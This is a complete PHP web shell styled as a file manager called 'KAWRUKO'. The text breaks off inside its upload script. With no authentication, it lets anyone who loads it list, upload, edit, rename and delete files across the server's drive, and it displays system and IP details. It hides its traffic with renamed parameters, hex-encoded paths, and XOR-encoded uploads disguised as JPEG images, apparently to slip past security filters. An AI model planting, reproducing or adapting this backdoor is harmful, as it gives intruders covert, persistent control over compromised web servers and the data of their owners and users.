<?php
header_remove('X-Powered-By');

/* === hex helpers for nakxn === */
function hex_(string $n): string {
    $y = '';
    for ($i = 0, $l = strlen($n); $i < $l; $i++) $y .= dechex(ord($n[$i]));
    return $y;
}
function uhex(string $y): string {
    if ($y === '' || preg_match('/^[0-9a-fA-F]+$/', $y) !== 1 || (strlen($y) % 2)) return '';
    $n = '';
    for ($i = 0, $l = strlen($y); $i < $l; $i += 2) $n .= chr(hexdec($y[$i] . $y[$i+1]));
    return $n;
}

/* ===== Root derived from current directory's drive ===== */
function drive_root(string $path): string {
    $p = str_replace('\\', '/', $path);
    if (preg_match('#^([A-Za-z]):/#', $p, $m)) return $m[1] . ':/';
    return '/';
}
$CURRENT = realpath(getcwd()) ?: getcwd();
$ROOT = drive_root($CURRENT);

/* ===== Server info for header ===== */
$unameFull = php_uname();
$serverSoftware = $_SERVER['SERVER_SOFTWARE'] ?? '';
function detect_server_type(string $soft): string {
    $s = strtolower($soft);
    if (strpos($s,'litespeed') !== false) return 'LiteSpeed';
    if (strpos($s,'apache') !== false) return 'Apache';
    if (strpos($s,'nginx') !== false) return 'nginx';
    if ($soft !== '') return $soft;
    return 'Unknown';
}
$serverType = detect_server_type($serverSoftware);

/* Best-effort server IP */
$serverIp = $_SERVER['SERVER_ADDR'] ?? '';
if ($serverIp === '') {
    $hostName = gethostname();
    if ($hostName) $serverIp = gethostbyname($hostName);
}
if (!filter_var($serverIp, FILTER_VALIDATE_IP)) {
    $serverName = $_SERVER['SERVER_NAME'] ?? '';
    if ($serverName) {
        $ip = gethostbyname($serverName);
        if (filter_var($ip, FILTER_VALIDATE_IP)) $serverIp = $ip;
    }
}
if ($serverIp === '') $serverIp = 'Unknown';

/* ===== Helpers ===== */
function is_abs_path(string $p): bool {
    if (preg_match('#^[A-Za-z]:[\\\\/]#', $p) === 1) return true;
    if (substr($p, 0, 2) === '\\\\') return true;
    return isset($p[0]) && $p[0] === '/';
}
function normalize_slashes(string $p): string { return str_replace('\\', '/', $p); }

function safe_join(string $base, string $path): string {
    $base = realpath($base) ?: $base;
    $path = normalize_slashes($path);
    if ($path === '' || $path === '.') $candidate = $base;
    elseif (is_abs_path($path)) $candidate = $path;
    else $candidate = rtrim($base, "/\\") . DIRECTORY_SEPARATOR . $path;
    $real = realpath($candidate);
    if ($real === false) $real = $candidate;
    return $real;
}

function within_root(string $candidate, string $root): bool {
    $candidate = normalize_slashes($candidate);
    $root = rtrim(normalize_slashes($root), '/');
    return $candidate === $root || strpos($candidate, $root . '/') === 0;
}

function format_size(int $bytes): string {
    if ($bytes < 1024) return $bytes . " B";
    $kb = $bytes / 1024;
    if ($kb < 1024) return number_format($kb, 2) . " KB";
    $mb = $kb / 1024;
    if ($mb < 1024) return number_format($mb, 2) . " MB";
    $gb = $mb / 1024;
    return number_format($gb, 2) . " GB";
}

function list_dir(string $path, string $root): array {
    $items = [];
    if (!is_dir($path)) return $items;
    $dir = scandir($path, SCANDIR_SORT_ASCENDING);
    if ($dir === false) return $items;
    foreach ($dir as $name) {
        if ($name === "." || $name === "..") continue;
        $full = $path . DIRECTORY_SEPARATOR . $name;
        $real = realpath($full) ?: $full;
        if (!within_root($real, $root)) continue;
        $isDir = is_dir($real);
        $items[] = [
            "name" => $name,
            "type" => $isDir ? "dir" : "file",
            "size" => $isDir ? null : @filesize($real),
            "mtime" => @filemtime($real) ?: 0,
            "path" => normalize_slashes($real),
        ];
    }
    usort($items, function($a, $b){
        if ($a["type"] !== $b["type"]) return $a["type"] === "dir" ? -1 : 1;
        return strcasecmp($a["name"], $b["name"]);
    });
    return $items;
}

/* Breadcrumb */
function breadcrumb_html(string $currentPath, string $root): string {
    $p = normalize_slashes($currentPath);

    if (preg_match('#^[A-Za-z]:/$#', $p)) {
        return '<span class="crumb current">'.htmlspecialchars($p).'</span>';
    }
    if (preg_match('#^([A-Za-z]:)(/.*)?$#', $p, $m)) {
        $drive = $m[1];
        $rest = $m[2] ?? '';
        $parts = array_values(array_filter(explode('/', $rest), fn($s)=>$s!==''));
        $out = [];
        $out[] = '<a href="#" data-path="'.htmlspecialchars("$drive/", ENT_QUOTES).'" class="crumb">'.htmlspecialchars("$drive/").'</a>';
        $acc = "$drive";
        foreach ($parts as $i => $seg) {
            $acc .= "/$seg";
            if ($i === count($parts)-1) $out[] = '<span class="crumb current">'.htmlspecialchars($seg).'</span>';
            else $out[] = '<a href="#" data-path="'.htmlspecialchars($acc, ENT_QUOTES).'" class="crumb">'.htmlspecialchars($seg).'</a>';
        }
        return implode('<span class="crumb-sep"> / </span>', $out);
    }
    if (preg_match('#^//([^/]+)/([^/]+)(/.*)?$#', $p, $m)) {
        $server = $m[1]; $share = $m[2]; $rest = $m[3] ?? '';
        $parts = array_values(array_filter(explode('/', $rest), fn($s)=>$s!==''));
        $out = [];
        $out[] = '<a href="#" data-path="//' . htmlspecialchars("$server/$share", ENT_QUOTES) . '" class="crumb">//'.htmlspecialchars("$server/$share").'</a>';
        $acc = '//' . $server . '/' . $share;
        foreach ($parts as $i => $seg) {
            $acc .= '/' . $seg;
            if ($i === count($parts)-1) $out[] = '<span class="crumb current">'.htmlspecialchars($seg).'</span>';
            else $out[] = '<a href="#" data-path="'.htmlspecialchars($acc, ENT_QUOTES).'" class="crumb">'.htmlspecialchars($seg).'</a>';
        }
        return implode('<span class="crumb-sep"> / </span>', $out);
    }
    $parts = explode('/', $p);
    $out = [];
    if (($parts[0] ?? '') === '') $out[] = '<a href="#" data-path="/" class="crumb">/</a>';
    $acc = '';
    foreach ($parts as $i => $seg) {
        if ($seg === '') continue;
        $acc .= '/' . $seg;
        if ($i === count($parts)-1) $out[] = '<span class="crumb current">'.htmlspecialchars($seg).'</span>';
        else $out[] = '<a href="#" data-path="'.htmlspecialchars($acc, ENT_QUOTES).'" class="crumb">'.htmlspecialchars($seg).'</a>';
    }
    if (!$out) $out[] = '<span class="crumb current">/</span>';
    return implode('<span class="crumb-sep"> / </span>', $out);
}

function json_response($data, int $code = 200): void {
    http_response_code($code);
    header('Content-Type: application/json; charset=UTF-8');
    echo json_encode($data);
    exit;
}

/* decode hex nakxn from POST/GET, clamp to root */
function requested_path(string $root): string {
    $raw = $_POST['nakxn'] ?? ($_GET['nakxn'] ?? '');
    $decoded = $raw !== '' ? uhex((string)$raw) : $root;
    $path = (string)$decoded;
    $resolved = safe_join($root, $path);
    if (!within_root($resolved, $root)) $resolved = $root;
    return $resolved;
}

/* ===== Upload XOR-stream (raw POST) ===== */
function xor_decode_stream_upload($in, $out): void {
    $bufSize = 65536;
    $index = 0;
    while (!feof($in)) {
        $chunk = fread($in, $bufSize);
        if ($chunk === '' || $chunk === false) break;
        $len = strlen($chunk);
        for ($i = 0; $i < $len; $i++, $index++) {
            $key = ($index * 17 + (int)floor(log($index + 2) * pi() * 1000)) & 0xFF;
            $chunk[$i] = chr(ord($chunk[$i]) ^ $key);
        }
        fwrite($out, $chunk);
    }
}

/* ===== Editor XOR key (log10 + hexdec) ===== */
function editor_xor_key(int $i): int {
    $h = dechex(($i * 31 + 7) & 0xFFFFFFFF);
    $last2 = substr($h, -2);
    $hx = hexdec($last2);
    $k = ($hx ^ ($i & 0xFF)) + (int)floor(log10($i + 3) * 97);
    return $k & 0xFF;
}

/* READ (plain) */
function editor_stream_read_file_plain(string $file): string {
    $fh = @fopen($file, 'rb');
    if (!$fh) return '';
    $bufSize = 65536;
    $out = '';
    while (!feof($fh)) {
        $chunk = fread($fh, $bufSize);
        if ($chunk === '' || $chunk === false) break;
        $out .= $chunk;
    }
    fclose($fh);
    return $out;
}

/* SAVE paths */
function editor_stream_decode_and_write_b64(string $encoded_b64, string $dest): bool {
    $raw = base64_decode($encoded_b64, true);
    if ($raw === false) return false;
    $fh = @fopen($dest, 'wb');
    if (!$fh) return false;

    $index = 0;
    $len = strlen($raw);
    $chunkSize = 65536;
    for ($offset = 0; $offset < $len; $offset += $chunkSize) {
        $slice = substr($raw, $offset, $chunkSize);
        $slen = strlen($slice);
        for ($i = 0; $i < $slen; $i++, $index++) {
            $key = editor_xor_key($index);
            $slice[$i] = chr(ord($slice[$i]) ^ $key);
        }
        if (fwrite($fh, $slice) === false) { fclose($fh); return false; }
    }
    fclose($fh);
    return true;
}
function editor_stream_decode_and_write_legacy(string $encoded, string $dest): bool {
    $encoded = stripslashes($encoded);
    $fh = @fopen($dest, 'wb');
    if (!$fh) return false;

    $index = 0;
    $len = strlen($encoded);
    $chunkSize = 65536;
    for ($offset = 0; $offset < $len; $offset += $chunkSize) {
        $slice = substr($encoded, $offset, $chunkSize);
        $slen = strlen($slice);
        for ($i = 0; $i < $slen; $i++, $index++) {
            $key = editor_xor_key($index);
            $slice[$i] = chr(ord($slice[$i]) ^ $key);
        }
        if (fwrite($fh, $slice) === false) { fclose($fh); return false; }
    }
    fclose($fh);
    return true;
}

/* ===== AJAX API ===== */
$action = null;
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // CHANGED: use 'shikigf' instead of 'action'
    $action = $_POST['shikigf'] ?? ($_GET['shikigf'] ?? null);
}
if ($action !== null && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $path = requested_path($ROOT);
    if (!within_root($path, $ROOT)) json_response(["ok" => false, "error" => "Path out of drive root."], 400);

    switch ($action) {
        case 'list':
            $items = list_dir($path, $ROOT);
            $payload = array_map(function($i){
                return [
                    "name" => $i["name"],
                    "type" => $i["type"],
                    "size" => $i["type"] === "dir" ? "" : ($i["size"] !== false && $i["size"] !== null ? format_size((int)$i["size"]) : ''),
                    "rawSize" => $i["type"] === "dir" ? 0 : ((int)$i["size"]),
                    "mtime" => $i["mtime"] ? date('Y-m-d H:i:s', (int)$i["mtime"]) : '',
                    "path" => $i["path"]
                ];
            }, $items);
            json_response([
                "ok" => true,
                "path" => normalize_slashes($path),
                "breadcrumb" => breadcrumb_html($path, $ROOT),
                "items" => $payload
            ]);
            break;

        /* Upload: RAW POST body (XOR stream), params in URL: nakxn (hex), mekitinna */
        case 'upload_xor':
            // ---------- ORIGINAL METHOD (preferred) ----------
            // Expect: raw body (XOR'ed), filename in 'mekitinna' (GET or POST)
            $origTried = false;
            $origOk    = false;
            $origName  = (string)($_GET['mekitinna'] ?? $_POST['mekitinna'] ?? '');

            if ($origName !== '') {
                $origTried = true;

                $dest = rtrim($path, "/\\") . DIRECTORY_SEPARATOR . basename($origName);

                // Read the raw body into a temp stream
                $in = @fopen('php://input', 'rb');
                if ($in) {
                    $tmp = @fopen('php://temp', 'w+b');
                    if ($tmp) {
                        $bytes = @stream_copy_to_stream($in, $tmp);
                        @fclose($in);

                        if ($bytes > 0) {
                            @rewind($tmp);

                            $out = @fopen($dest, 'wb');
                            if ($out) {
                                // Decode using the same XOR stream logic
                                xor_decode_stream_upload($tmp, $out);
                                @fclose($out);
                                $origOk = true;
                            }
                        }
                        @fclose($tmp);
                    } else {
                        @fclose($in);
                    }
                }
            }

            if ($origOk) {
                // Original upload succeeded — do NOT run the alternative to avoid duplicates
                json_response([
                    "ok"     => true,
                    "saved"  => [basename($origName)],
                    "notice" => "Uploaded via original raw-body method; alternative multipart path skipped to prevent duplicate."
                ]);
            }

            // ---------- FALLBACK: ALTERNATIVE MULTIPART METHOD ----------
            // Only run if original didn't succeed.
            // Expect: POST 'benkyo' (filename) + FILE 'dakeja'[tmp_name] (XOR'ed content)
            if (isset($_POST['benkyo'], $_FILES['dakeja'])) {
                $altName = basename((string)$_POST['benkyo']);
                $tmpName = (string)($_FILES['dakeja']['tmp_name'] ?? '');

                // If the alt filename equals the original and the file already exists from a previous attempt, skip to avoid duplicates
                $destAlt = rtrim($path, "/\\") . DIRECTORY_SEPARATOR . $altName;
                if ($altName !== '' && file_exists($destAlt) && $origTried) {
                    json_response([
                        "ok"     => false,
                        "error"  => "Duplicate upload prevented.",
                        "notice" => "Original path attempted earlier. Skipping alternative to avoid overwriting the same file."
                    ], 400);
                }

                if ($altName !== '' && $tmpName !== '' && is_uploaded_file($tmpName)) {
                    $inAlt = @fopen($tmpName, 'rb');
                    if ($inAlt) {
                        $outAlt = @fopen($destAlt, 'wb');
                        if ($outAlt) {
                            xor_decode_stream_upload($inAlt, $outAlt);
                            @fclose($outAlt);
                            @fclose($inAlt);
                            json_response([
                                "ok"     => true,
                                "saved"  => [$altName],
                                "notice" => $origTried
                                    ? "Original method failed; uploaded via alternative multipart method."
                                    : "Uploaded via alternative multipart method (original not provided)."
                            ]);
                        }
                        @fclose($inAlt);
                    }
                }

                // Alternative present but failed to save
                json_response([
                    "ok"     => false,
                    "error"  => "File upload failed (multipart).",
                    "notice" => $origTried
                        ? "Original method failed; alternative also failed."
                        : "Original method not used; alternative failed."
                ], 400);
            }

            // Neither method succeeded or the required inputs were missing
            json_response([
                "ok"     => false,
                "error"  => "Missing or invalid upload data.",
                "notice" => $origTried
                    ? "Original method attempted but failed; no alternative data provided."
                    : "No valid data for original method; no alternative provided."
            ], 400);
            break;

        case 'delete':
            $name = (string)($_POST['name'] ?? '');
            $target = realpath(rtrim($path, "/\\") . DIRECTORY_SEPARATOR . $name);
            if ($target === false || !within_root($target, $ROOT)) json_response(["ok" => false, "error" => "Invalid target."], 400);
            $ok = is_dir($target) ? @rmdir($target) : @unlink($target);
            json_response(["ok" => (bool)$ok, "error" => $ok ? null : "Delete failed."]);
            break;

        case 'rename':
            $old = (string)($_POST['old'] ?? '');
            $new = (string)($_POST['new'] ?? '');
            if ($old === '' || $new === '') json_response(["ok" => false, "error" => "Missing names."], 400);
            $from = realpath(rtrim($path, "/\\") . DIRECTORY_SEPARATOR . $old);
            $to = rtrim($path, "/\\") . DIRECTORY_SEPARATOR . basename($new);
            if ($from === false || !within_root($from, $ROOT) || !within_root($to, $ROOT)) {
                json_response(["ok" => false, "error" => "Invalid path."], 400);
            }
            $ok = @rename($from, $to);
            json_response(["ok" => (bool)$ok, "error" => $ok ? null : "Rename failed."]);
            break;

        case 'read':
            $name = (string)($_POST['name'] ?? '');
            $target = realpath(rtrim($path, "/\\") . DIRECTORY_SEPARATOR . $name);
            if ($target === false || !within_root($target, $ROOT) || !is_file($target)) {
                json_response(["ok" => false, "error" => "Invalid file."], 400);
            }
            $plain = editor_stream_read_file_plain($target);
            json_response(["ok" => true, "content" => $plain, "name" => basename($target)]);
            break;

        case 'save':
            $name = (string)($_POST['name'] ?? '');
            $b64 = (string)($_POST['content_b64'] ?? '');
            $legacy = (string)($_POST['content'] ?? '');
            $target = realpath(rtrim($path, "/\\") . DIRECTORY_SEPARATOR . $name);
            if ($target === false || !within_root($target, $ROOT) || !is_file($target)) {
                json_response(["ok" => false, "error" => "Invalid file."], 400);
            }
            $ok = false;
            if ($b64 !== '') $ok = editor_stream_decode_and_write_b64($b64, $target);
            elseif ($legacy !== '') $ok = editor_stream_decode_and_write_legacy($legacy, $target);
            json_response(["ok" => $ok, "error" => $ok ? null : "Save failed."]);
            break;

        default:
            json_response(["ok" => false, "error" => "Unknown shikigf."], 400);
    }
}

/* initial path for JS (decode hex from GET) */
$initialParam = isset($_GET['nakxn']) ? (string)$_GET['nakxn'] : '';
$initialPath  = $initialParam !== '' ? uhex($initialParam) : $CURRENT;
$statePath    = htmlspecialchars(normalize_slashes($initialPath), ENT_QUOTES);
?>
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>🌸 KAWRUKO</title>

<link href="https://fonts.googleapis.com/css2?family=Zilla+Slab:wght@400;500;700&display=swap" rel="stylesheet">

<style>
:root{
  --c1:#784848; --c2:#D89090; --c3:#76645B; --c4:#A86078; --c5:#47434C;
  --bg:#1e1d22; --panel:#2a2830; --err:#ff6b6b; --ok:#58c98b; --warn:#ffcc66;
  --radius:14px; --shadow:0 10px 30px rgba(0,0,0,.35);
}
*{box-sizing:border-box}
html,body{height:100%}
body{ margin:0; font-family:"Zilla Slab", system-ui, -apple-system, Segoe UI, Roboto, "Helvetica Neue", Arial, "Noto Sans", "Liberation Sans", sans-serif; background: var(--bg); color:#f4f1f6; }
.wrapper{ max-width:1100px; margin:32px auto; padding:0 16px; }

.header{
  background: linear-gradient(135deg, var(--c5), var(--c1));
  border:1px solid #00000022; box-shadow: var(--shadow);
  border-radius: var(--radius); padding:12px 16px;
  display:flex; gap:14px; align-items:center; justify-content:space-between;
}
.brand{ display:flex; align-items:center; gap:12px; }
.brand .logo{ width: 40px; height: 40px; border-radius: 10px; overflow: hidden; background: transparent; }
.brand .logo img{ width: 100%; height: 100%; object-fit: contain; display: block; }
.brand h1{font-size:18px; margin:0; letter-spacing:.3px}

.server-info{ text-align: right; display:flex; flex-direction:column; gap:6px; align-items:flex-end; }
.server-info .badge{
  display:inline-block; padding:6px 8px; border-radius:12px;
  background:#ffffff12; border:1px solid #00000033; color:#f6e9ef;
  font-size:12px; line-height:1.3em;
}
.server-info .badge code{ color:#fff; font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace; }

.breadcrumb{
  margin-top:12px; padding:12px 16px; background: var(--panel);
  border:1px solid #00000030; border-radius: var(--radius);
  box-shadow: var(--shadow); display:flex; flex-wrap:wrap; gap:8px; align-items:center;
}
.crumb, .crumb.current{
  text-decoration:none; padding:6px 10px; border-radius:999px;
  border:1px solid #00000033; background:#ffffff0e; color:#f6e9ef;
  transition: all .15s ease-in-out;
}
.crumb:hover{background:#ffffff25}
.crumb.current{background:#ffffff28; color:#fff; border-color:#00000044}
.crumb-sep{opacity:.6}

.panel{ margin-top:16px; background: var(--panel); border-radius: var(--radius); border:1px solid #0000002a; box-shadow: var(--shadow); overflow:hidden; }

.toolbar{
  padding:14px; display:flex; gap:10px; flex-wrap:wrap;
  border-bottom:1px solid #0000002a; background:#2a2730;
}
.btn{
  appearance:none; border:none; cursor:pointer;
  padding:10px 14px; border-radius:12px;
  background: linear-gradient(135deg, var(--c2), var(--c4));
  color:#291b20; font-weight:700;
  box-shadow: 0 6px 14px #00000045, inset 0 1px 0 #ffffff55;
  transition: transform .06s ease, filter .2s ease;
}
.btn:hover{ filter:brightness(1.05) }
.btn:active{ transform:translateY(1px) }
.btn.secondary{ background: linear-gradient(135deg, #ffffff18, #ffffff12); color:#f1e7ea; font-weight:600; border:1px solid #00000033; }
.input, .file{ padding:10px 12px; border-radius:12px; border:1px solid #0000003b; background:#1f1d23; color:#eee; min-width:0; }

.table-wrap{ width:100%; overflow:auto }
table{ width:100%; border-collapse:separate; border-spacing:0; }
thead th{ text-align:left; font-weight:700; padding:14px 14px; font-size:14px; position:sticky; top:0; background:#232129; z-index:1; }
tbody td{ padding:14px; border-top:1px solid #00000022; font-size:15px; }
tr:hover td{ background:#ffffff06 }
.type-badge{ font-size:12px; padding:4px 8px; border-radius:999px; background:#ffffff14; border:1px solid #00000033; }
.name{ display:flex; align-items:center; gap:10px; min-width:200px; }
.icon{ width:28px; height:28px; border-radius:8px; display:grid; place-items:center; font-size:14px; background: linear-gradient(135deg, var(--c3), var(--c5)); border:1px solid #00000044; }
.icon.folder{ background: linear-gradient(135deg, var(--c1), var(--c3)); }
.icon.file{ background: linear-gradient(135deg, var(--c4), var(--c2)); }
.row-actions{ display:flex; gap:8px; }
.row-actions .btn{ padding:6px 10px; border-radius:10px; font-size:13px }
.row-actions .btn.danger{ background: linear-gradient(135deg, var(--err), #d35454); color:#2b1010 }
.row-actions .btn.muted{ background: linear-gradient(135deg, #ffffff18, #ffffff10); color:#eee; border:1px solid #00000033 }

#toasts{ position:fixed; right:18px; bottom:18px; display:flex; flex-direction:column; gap:10px; z-index:10050; }
.toast{
  min-width:240px; max-width:360px; padding:10px 12px; border-radius:12px;
  background:#221f26; border:1px solid #00000044; box-shadow: var(--shadow);
  color:#eee; display:flex; align-items:center; gap:10px; animation: slidein .2s ease-out;
}
.toast.ok{ border-color:#2a6146; }
.toast.err{ border-color:#663232; }
.toast.warn{ border-color:#6a5a2a; }
.toast .dot{ width:10px; height:10px; border-radius:999px; }
.toast.ok .dot{ background: var(--ok); }
.toast.err .dot{ background: var(--err); }
.toast.warn .dot{ background: var(--warn); }
@keyframes slidein { from{ transform:translateY(8px); opacity:0 } to{ transform:translateY(0); opacity:1 } }

#editorModal{ position:fixed; inset:0; display:none; align-items:center; justify-content:center; background: rgba(14, 12, 16, .6); padding:20px; z-index:10000; }
.modal-card{ width:min(900px, 95vw); background: #241f27; border:1px solid #00000055; border-radius:16px; box-shadow: var(--shadow); overflow:hidden; display:flex; flex-direction:column; }
.modal-head{ padding:14px 16px; background: linear-gradient(135deg, var(--c5), var(--c1)); display:flex; align-items:center; justify-content:space-between; gap:8px; }
.modal-title{font-weight:700}
.modal-body{ padding:12px }
.modal-actions{ padding:12px; display:flex; gap:8px; justify-content:flex-end; border-top:1px solid #00000033; background:#211d24; }
#editorArea{ width:100%; height:55vh; resize:vertical; padding:12px; border-radius:12px; border:1px solid #00000044; background:#18161b; color:#eee; font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace; }

.footer{ margin-top:18px; text-align:center; color:#cfc9d2; opacity:.9; font-size:13px; }

@media (max-width: 640px){
  .row-actions .btn{ padding:6px 8px }
  td:nth-child(3), th:nth-child(3){ display:none }
}
</style>
</head>
<body>
<div class="wrapper">
  <div class="header">
    <div class="brand">
      <div class="logo"><img src="https://raw.githubusercontent.com/lovelijapeli/zeinhorobosu/refs/heads/main/image.png" alt="Icon"></div>
      <h1>KAWRUKO</h1>
    </div>
    <div class="server-info">
      <span class="badge">Server: <code><?= htmlspecialchars($unameFull) ?></code></span>
      <span class="badge">IP: <code><?= htmlspecialchars($serverIp) ?></code></span>
      <span class="badge">Software: <code><?= htmlspecialchars($serverType) ?></code></span>
    </div>
  </div>

  <div id="breadcrumb" class="breadcrumb">Loading…</div>

  <div class="panel">
    <div class="toolbar">
      <form id="uploadForm">
        <input type="file" id="fileInput" class="file" multiple />
        <button class="btn" type="submit">Upload</button>
      </form>

      <div style="flex:1"></div>

      <form id="renameForm" style="display:flex; gap:8px; align-items:center">
        <input class="input" type="text" id="oldName" placeholder="Old name.ext" />
        <span>→</span>
        <input class="input" type="text" id="newName" placeholder="New name.ext" />
        <button class="btn secondary" type="submit">Rename</button>
      </form>
    </div>

    <div class="table-wrap">
      <table id="fmTable">
        <thead>
          <tr>
            <th style="min-width:260px">Name</th>
            <th>Type</th>
            <th>Size</th>
            <th>Last Modified</th>
            <th>Actions</th>
          </tr>
        </thead>
        <tbody id="fmBody">
          <tr><td colspan="5" style="padding:20px; opacity:.8">Loading directory…</td></tr>
        </tbody>
      </table>
    </div>
  </div>

  <div class="footer">&copy zeinhorobosu</div>
</div>

<div id="toasts" aria-live="polite" aria-atomic="true"></div>

<div id="editorModal" aria-hidden="true">
  <div class="modal-card">
    <div class="modal-head">
      <div class="modal-title" id="editorTitle">Edit file</div>
      <button class="btn secondary" id="editorClose" type="button">Close</button>
    </div>
    <div class="modal-body">
      <textarea id="editorArea" spellcheck="false"></textarea>
    </div>
    <div class="modal-actions">
      <button class="btn" id="editorSave" type="button">Save</button>
    </div>
  </div>
</div>

<script>
function toast(msg, type='ok', timeout=2600){
  const wrap = document.getElementById('toasts');
  const el = document.createElement('div');
  el.className = 'toast ' + type;
  el.innerHTML = `<span class="dot"></span><div>${msg}</div>`;
  wrap.appendChild(el);
  setTimeout(()=>{ el.style.opacity='0'; el.style.transform='translateY(6px)'; }, timeout);
  setTimeout(()=>{ el.remove(); }, timeout+350);
}

const state = {
  path: "<?= $statePath ?>",
  editing: { name: null }
};

function toHex(str){
  let out = '';
  for (let i = 0; i < str.length; i++) out += str.charCodeAt(i).toString(16);
  return out;
}

// Generic API using shikigf
async function api(shikigf, data = {}) {
  const form = new FormData();
  form.append('shikigf', shikigf);   // CHANGED: action -> shikigf
  form.append('nakxn', toHex(state.path)); // hex path in POST for normal actions
  for (const [k,v] of Object.entries(data)) form.append(k, v);
  const res = await fetch(location.href, { method:'POST', body: form });
  const text = await res.text();
  try { const j = JSON.parse(text); if (!j.ok) throw new Error(j.error || 'Request failed'); return j; }
  catch(e){ console.error('Server raw:', text); throw new Error('Invalid server response'); }
}

const uploadForm = document.getElementById('uploadForm');
const fileInput  = document.getElementById('fileInput');
const fileLabel  = document.getElementById('fileLabel');
function resetUploadForm(){ try { uploadForm.reset(); } catch(_) {} if (fileInput) fileInput.value = ''; if (fileLabel) fileLabel.textContent = 'Choose File'; }

document.addEventListener('click', (e)=>{
  const btn = e.target.closest('.btn');
  if (btn && !btn.closest('#uploadForm')) resetUploadForm();
});

if (fileInput) {
  fileInput.addEventListener('change', function(){
    if (fileLabel) fileLabel.textContent = fileInput.files.length ? fileInput.files[0].name : 'Choose File';
  });
}

function render(items){
  const tbody = document.getElementById('fmBody');
  tbody.innerHTML = '';
  if (!items.length){
    tbody.innerHTML = '<tr><td colspan="5" style="padding:20px; opacity:.8">Empty directory</td></tr>';
    return;
  }
  for (const it of items){
    const tr = document.createElement('tr');

    const name = document.createElement('td');
    name.className = 'name';
    const icon = document.createElement('div');
    icon.className = 'icon ' + (it.type === 'dir' ? 'folder' : 'file');
    icon.textContent = it.type === 'dir' ? '📁' : '📄';

    const link = document.createElement('a');
    link.textContent = it.name;
    link.style.color = '#fff';
    link.style.textDecoration = 'none';

    if (it.type === 'dir') {
      const newUrl = new URL(location.origin + location.pathname);
      newUrl.searchParams.set('nakxn', toHex(it.path)); // hex in URL for deep-link
      link.href = newUrl.toString();
      link.addEventListener('click', (e) => {
        const isModified = e.ctrlKey || e.metaKey || e.shiftKey || e.altKey;
        const isMiddle = e.button === 1;
        if (!isModified && !isMiddle) {
          e.preventDefault();
          changeDirectory(it.path);
        }
      });
    } else {
      link.href = '#';
      link.addEventListener('click', (e)=>{
        e.preventDefault();
        resetUploadForm();
        openEditor(it.name);
      });
    }

    name.appendChild(icon); name.appendChild(link);

    const type = document.createElement('td');
    type.innerHTML = `<span class="type-badge">${it.type}</span>`;

    const size = document.createElement('td'); size.textContent = it.size || '';
    const mtime = document.createElement('td'); mtime.textContent = it.mtime;

    const actions = document.createElement('td');
    const rowActions = document.createElement('div'); rowActions.className = 'row-actions';

    if (it.type === 'file'){
      const editBtn = document.createElement('button');
      editBtn.className = 'btn muted'; editBtn.textContent = 'Edit';
      editBtn.addEventListener('click', ()=> { resetUploadForm(); openEditor(it.name); });
      rowActions.appendChild(editBtn);
    }

    const delBtn = document.createElement('button');
    delBtn.className = 'btn danger'; delBtn.textContent = 'Delete';
    delBtn.addEventListener('click', async ()=>{
      try { await api('delete', { name: it.name }); toast(`Deleted "${it.name}"`, 'ok'); resetUploadForm(); await refresh(); }
      catch (e){ toast(e.message || 'Delete failed', 'err'); }
    });
    rowActions.appendChild(delBtn);

    actions.appendChild(rowActions);

    tr.appendChild(name);
    tr.appendChild(type);
    tr.appendChild(size);
    tr.appendChild(mtime);
    tr.appendChild(actions);

    tbody.appendChild(tr);
  }
}

async function refresh(){
  try{
    const j = await api('list');
    state.path = j.path;
    document.getElementById('breadcrumb').innerHTML = j.breadcrumb;
    attachBreadcrumbHandlers();
    render(j.items);
  }catch(e){
    toast(e.message, 'err');
  }
}

function attachBreadcrumbHandlers(){
  document.querySelectorAll('.crumb').forEach(a=>{
    a.addEventListener('click', (ev)=>{
      ev.preventDefault();
      const p = a.getAttribute('data-path');
      if (p) changeDirectory(p);
    });
  });
}

async function changeDirectory(newPath){
  state.path = newPath;
  resetUploadForm();
  try { await refresh(); toast(`Directory: ${newPath}`, 'ok', 1600); }
  catch(e){ toast(e.message, 'err'); }
}

uploadForm.addEventListener('submit', async (e)=>{
  e.preventDefault();
  const files = fileInput.files;
  if (!files.length) { toast('No files selected', 'warn'); return; }

  // same XOR as original
  function xorEncode(u){
    for (let i = 0; i < u.length; i++){
      const key = ((i * 17) + Math.floor(Math.log(i + 2) * Math.PI * 1000)) & 0xFF;
      u[i] ^= key;
    }
    return u;
  }

  // Helper: original method (raw body + mekitinna)
  async function sendOriginal(file, encodedUint8){
    const url = new URL(location.href);
    url.searchParams.set('shikigf', 'upload_xor');    // server action
    url.searchParams.set('nakxn', toHex(state.path)); // hex dir
    url.searchParams.set('mekitinna', file.name);     // filename

    const res = await fetch(url.toString(), {
      method: 'POST',
      headers: {
        'Content-Type': 'image/jpeg',
        'X-Requested-With': 'XMLHttpRequest'
      },
      body: encodedUint8
    });
    const text = await res.text();
    let j;
    try { j = JSON.parse(text); } catch(_){ throw new Error('Invalid server response (original)'); }
    if (!j.ok) throw new Error(j.error || 'Upload failed (original)');
    return j;
  }

  // Helper: alternative method (multipart form-data: benkyo + dakeja)
async function sendAlternative(file, encodedUint8){
  const form = new FormData();
  form.append('shikigf', 'upload_xor');         // same endpoint
  form.append('nakxn', toHex(state.path));      // same path param
  form.append('benkyo', file.name);             // filename

  const blob = new Blob([encodedUint8], { type: 'image/jpeg' });
  form.append('dakeja', blob, file.name);

  const res = await fetch(location.href, { method: 'POST', body: form });
  const text = await res.text();
  let j;
  try { j = JSON.parse(text); } catch(_){ throw new Error('Invalid server response (alternative)'); }
  if (!j.ok) throw new Error(j.error || 'Upload failed (alternative)');
  return j;
}

  let okCount = 0, failCount = 0;

  for (const file of files){
    try{
      // 1) XOR-encode the file in the browser (same as before)
      const buf = await file.arrayBuffer();
      const u   = xorEncode(new Uint8Array(buf)); // XOR (log + π)

      // 2) Try ORIGINAL method first
      let result;
      try {
        result = await sendOriginal(file, u);
        // If server succeeded via original, it will include a notice and skip alt.
        toast(`Uploaded "${file.name}" (original)`, 'ok');
      } catch (origErr) {
        // 3) Fallback to ALTERNATIVE method
        try {
          result = await sendAlternative(file, u);
          // Server might add a notice if it ran the fallback.
          toast(`Uploaded "${file.name}" (alternative)`, 'ok');
        } catch (altErr) {
